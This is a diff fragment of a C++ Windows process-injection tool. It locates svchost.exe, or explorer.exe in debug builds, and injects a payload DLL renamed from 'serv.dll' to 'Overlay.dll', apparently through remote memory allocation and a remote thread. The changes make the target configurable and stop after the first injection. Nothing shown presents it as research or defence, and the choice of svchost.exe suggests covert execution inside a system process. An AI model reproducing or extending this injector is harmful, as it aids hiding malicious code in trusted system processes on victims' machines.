@@ -3,6 +3,8 @@
 #include <tlhelp32.h>
 #include <string>
 
+//#define DEBUG
+
 std::string ChooseDLL()
 {
 	OPENFILENAME ofn;
@@ -15,7 +17,13 @@ std::string ChooseDLL()
 		return fileName;
 }
 
-#define PAYLOAD_FILE "/serv.dll"
+#define PAYLOAD_FILE "/Overlay.dll"
+
+#if defined(DEBUG)
+#define PAYLOAD_TARGET "explorer.exe"
+#else
+#define PAYLOAD_TARGET "svchost.exe"
+#endif
 
 int main()
 {
@@ -37,7 +45,7 @@ int main()
 	{
 		while (Process32Next(snapshot, &entry) == TRUE)
 		{
-			if (strcmp(entry.szExeFile, "svchost.exe") == 0)
+			if (strcmp(entry.szExeFile, PAYLOAD_TARGET) == 0)
 			{
 				DWORD pID = entry.th32ProcessID;
 
@@ -66,6 +74,8 @@ int main()
 					//VirtualFreeEx(hProcess, allocMemory, NULL, MEM_RELEASE);
 					CloseHandle(hThread);
 					CloseHandle(hProcess);
+
+					break;
 				}
 			}
 		}
